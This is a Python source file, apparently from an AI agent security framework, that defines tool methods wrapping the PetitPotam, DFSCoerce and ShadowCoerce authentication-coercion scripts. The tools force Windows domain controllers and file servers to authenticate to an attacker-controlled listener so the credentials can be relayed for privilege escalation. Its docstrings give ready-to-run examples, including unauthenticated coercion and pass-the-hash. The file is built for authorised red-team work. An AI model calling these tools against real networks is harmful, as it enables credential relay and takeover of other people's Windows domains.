"""Authentication coercion tools for forcing NTLM/Kerberos relay attacks.

Wraps standalone coercion scripts that trigger Windows RPC calls to force
a target machine to authenticate to an attacker-controlled listener.  The
captured authentication is then relayed via ``impacket_ntlmrelayx`` (NTLM)
or ``krbrelayx_relay`` (Kerberos) for privilege escalation.

Supported protocols:

- **MS-EFSRPC** (PetitPotam) — most reliable, works when spooler is disabled
- **MS-DFSNM** (DFSCoerce) — alternative when EFS is hardened
- **MS-FSRVP** (ShadowCoerce) — targets file servers with VSS enabled

The existing ``krbrelayx_printer_bug`` (MS-RPRN) remains in krbrelayx.py
as it is part of that toolkit.
"""

from __future__ import annotations

import sys
from pathlib import Path

from dreadnode import Config
from dreadnode.agents.tools import Toolset, tool_method
from dreadnode.tools.execute import execute

g_default_petitpotam_path = Path("/opt/PetitPotam/")
g_default_dfscoerce_path = Path("/opt/DFSCoerce/")
g_default_shadowcoerce_path = Path("/opt/ShadowCoerce/")


def _resolve_script(base_path: Path, script_name: str, repo_url: str) -> Path:
    """Locate a coercion script, raising a clear error if not found."""
    script = base_path / script_name
    if script.is_file():
        return script
    raise FileNotFoundError(
        f"Coercion script '{script_name}' not found at '{base_path}'. "
        f"Install via: git clone {repo_url} {base_path}"
    )


class Coercion(Toolset):
    """Authentication coercion methods for triggering relay attacks.

    Each method forces a target machine to authenticate to an
    attacker-controlled listener via a different Windows RPC protocol.
    Use after starting a relay listener (``impacket_ntlmrelayx`` or
    ``krbrelayx_relay``).

    Repositories:
    - PetitPotam: https://github.com/topotam/PetitPotam
    - DFSCoerce: https://github.com/Wh04m1001/DFSCoerce
    - ShadowCoerce: https://github.com/ShutdownRepo/ShadowCoerce
    """

    timeout: int = Config(default=30)
    """Default timeout for coercion commands in seconds."""
    petitpotam_path: Path = Config(default=g_default_petitpotam_path)
    """Directory containing PetitPotam.py."""
    dfscoerce_path: Path = Config(default=g_default_dfscoerce_path)
    """Directory containing dfscoerce.py."""
    shadowcoerce_path: Path = Config(default=g_default_shadowcoerce_path)
    """Directory containing shadowcoerce.py."""

    @tool_method(catch=True)
    async def coerce_petitpotam(
        self,
        listener: str,
        target: str,
        *,
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        hashes: str | None = None,
        no_pass: bool = False,
        kerberos: bool = False,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        pipe: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Coerce authentication via MS-EFSRPC (PetitPotam).

        Triggers EfsRpcOpenFileRaw on the target to force it to authenticate
        to the listener.  Most reliable coercion method — works even when
        Print Spooler is disabled.  Pair with ``impacket_ntlmrelayx`` or
        ``krbrelayx_relay`` to capture and relay the authentication.

        Usage Examples:
            # Coerce DC to authenticate to relay listener
            await coerce_petitpotam(
                listener="10.10.10.100",
                target="dc01.corp.local",
                username="user",
                password="Password123",
                domain="corp.local"
            )

            # Unauthenticated coercion (works on unpatched systems)
            await coerce_petitpotam(
                listener="10.10.10.100",
                target="dc01.corp.local",
                no_pass=True
            )

            # Use specific named pipe
            await coerce_petitpotam(
                listener="10.10.10.100",
                target="dc01.corp.local",
                username="user",
                password="Password123",
                domain="corp.local",
                pipe="efsr"
            )

        <documentation>
        PetitPotam - PoC to coerce machine account authentication via
        MS-EFSRPC EfsRpcOpenFileRaw().

        positional arguments:
        listener              IP address or hostname of listener
        target                IP address or hostname of target

        options:
        -u USERNAME, --username USERNAME
                              Valid username
        -p PASSWORD, --password PASSWORD
                              Valid password
        -d DOMAIN, --domain DOMAIN
                              Valid domain name
        -hashes [LMHASH]:NTHASH
                              NT/LM hashes
        -no-pass              Don't ask for password (useful for -k)
        -k                    Use Kerberos authentication from ccache file
        -dc-ip ip address     IP Address of the domain controller
        -target-ip ip address IP Address of the target machine
        -pipe {efsr,lsarpc,samr,netlogon,lsass,all}
                              Named pipe to use (default: lsarpc)
        </documentation>

        Args:
            listener: Attacker IP/hostname receiving the coerced authentication (required).
            target: Target IP/hostname to coerce authentication from (required).
            username: Username for authentication to the target.
            password: Password for authentication.
            domain: Domain name for authentication.
            hashes: NTLM hashes in [LMHASH]:NTHASH format.
            no_pass: Don't prompt for password (for unauthenticated or Kerberos).
            kerberos: Use Kerberos authentication from ccache (KRB5CCNAME).
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            pipe: Named pipe — 'efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', or 'all'.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional stdin input.
        """
        args: list[str] = []

        if username:
            args.extend(["-u", username])
        if password:
            args.extend(["-p", password])
        if domain:
            args.extend(["-d", domain])
        if hashes:
            args.extend(["-hashes", hashes])
        if no_pass:
            args.append("-no-pass")
        if kerberos:
            args.append("-k")
        if dc_ip:
            args.extend(["-dc-ip", dc_ip])
        if target_ip:
            args.extend(["-target-ip", target_ip])
        if pipe:
            args.extend(["-pipe", pipe])

        args.extend([listener, target])

        script = _resolve_script(
            self.petitpotam_path, "PetitPotam.py",
            "https://github.com/topotam/PetitPotam",
        )
        return await execute(
            [sys.executable, str(script), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def coerce_dfscoerce(
        self,
        listener: str,
        target: str,
        *,
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        hashes: str | None = None,
        no_pass: bool = False,
        kerberos: bool = False,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Coerce authentication via MS-DFSNM (DFSCoerce).

        Triggers NetrDfsRemoveStdRoot on the target to force it to
        authenticate to the listener.  Alternative coercion vector when
        both Print Spooler and EFS are hardened.

        Usage Examples:
            # Coerce DC to authenticate to relay listener
            await coerce_dfscoerce(
                listener="10.10.10.100",
                target="dc01.corp.local",
                username="user",
                password="Password123",
                domain="corp.local"
            )

            # Coerce using pass-the-hash
            await coerce_dfscoerce(
                listener="10.10.10.100",
                target="dc01.corp.local",
                username="admin",
                domain="corp.local",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        DFSCoerce - PoC to coerce machine account authentication via
        MS-DFSNM NetrDfsRemoveStdRoot().

        positional arguments:
        listener              IP address or hostname of listener
        target                IP address or hostname of target

        options:
        -u USERNAME, --username USERNAME
                              Valid username
        -p PASSWORD, --password PASSWORD
                              Valid password
        -d DOMAIN, --domain DOMAIN
                              Valid domain name
        -hashes [LMHASH]:NTHASH
                              NT/LM hashes
        -no-pass              Don't ask for password (useful for -k)
        -k                    Use Kerberos authentication from ccache file
        -dc-ip ip address     IP Address of the domain controller
        -target-ip ip address IP Address of the target machine
        </documentation>

        Args:
            listener: Attacker IP/hostname receiving the coerced authentication (required).
            target: Target IP/hostname to coerce authentication from (required).
            username: Username for authentication to the target.
            password: Password for authentication.
            domain: Domain name for authentication.
            hashes: NTLM hashes in [LMHASH]:NTHASH format.
            no_pass: Don't prompt for password (for unauthenticated or Kerberos).
            kerberos: Use Kerberos authentication from ccache (KRB5CCNAME).
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional stdin input.
        """
        args: list[str] = []

        if username:
            args.extend(["-u", username])
        if password:
            args.extend(["-p", password])
        if domain:
            args.extend(["-d", domain])
        if hashes:
            args.extend(["-hashes", hashes])
        if no_pass:
            args.append("-no-pass")
        if kerberos:
            args.append("-k")
        if dc_ip:
            args.extend(["-dc-ip", dc_ip])
        if target_ip:
            args.extend(["-target-ip", target_ip])

        args.extend([listener, target])

        script = _resolve_script(
            self.dfscoerce_path, "dfscoerce.py",
            "https://github.com/Wh04m1001/DFSCoerce",
        )
        return await execute(
            [sys.executable, str(script), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def coerce_shadowcoerce(
        self,
        listener: str,
        target: str,
        *,
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        hashes: str | None = None,
        debug: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Coerce authentication via MS-FSRVP (ShadowCoerce).

        Triggers File Server Remote VSS Protocol calls on the target to
        force it to authenticate to the listener.  Targets file servers
        with VSS enabled.

        Note: ShadowCoerce does not support Kerberos auth, ``-no-pass``,
        ``-dc-ip``, or ``-target-ip`` flags.  Use PetitPotam or DFSCoerce
        if those are needed.

        Usage Examples:
            # Coerce file server to authenticate to relay listener
            await coerce_shadowcoerce(
                listener="10.10.10.100",
                target="fs01.corp.local",
                username="user",
                password="Password123",
                domain="corp.local"
            )

            # Coerce using pass-the-hash
            await coerce_shadowcoerce(
                listener="10.10.10.100",
                target="fs01.corp.local",
                username="admin",
                domain="corp.local",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        ShadowCoerce - MS-FSRVP authentication coercion PoC.

        positional arguments:
        listener              IP address or hostname of listener
        target                IP address or hostname of target

        options:
        -u USERNAME, --username USERNAME
                              Valid username
        -p PASSWORD, --password PASSWORD
                              Valid password
        -d DOMAIN, --domain DOMAIN
                              Valid domain name
        -hashes [LMHASH]:NTHASH
                              NT/LM hashes
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        </documentation>

        Args:
            listener: Attacker IP/hostname receiving the coerced authentication (required).
            target: Target IP/hostname to coerce authentication from (required).
            username: Username for authentication to the target.
            password: Password for authentication.
            domain: Domain name for authentication.
            hashes: NTLM hashes in [LMHASH]:NTHASH format.
            debug: Enable debug output.
            env: Optional environment variables.
            input: Optional stdin input.
        """
        args: list[str] = []

        if username:
            args.extend(["-u", username])
        if password:
            args.extend(["-p", password])
        if domain:
            args.extend(["-d", domain])
        if hashes:
            args.extend(["-hashes", hashes])
        if debug:
            args.append("-debug")

        args.extend([listener, target])

        script = _resolve_script(
            self.shadowcoerce_path, "shadowcoerce.py",
            "https://github.com/ShutdownRepo/ShadowCoerce",
        )
        return await execute(
            [sys.executable, str(script), *args],
            timeout=self.timeout,
            input=input,
            env=env,
        )
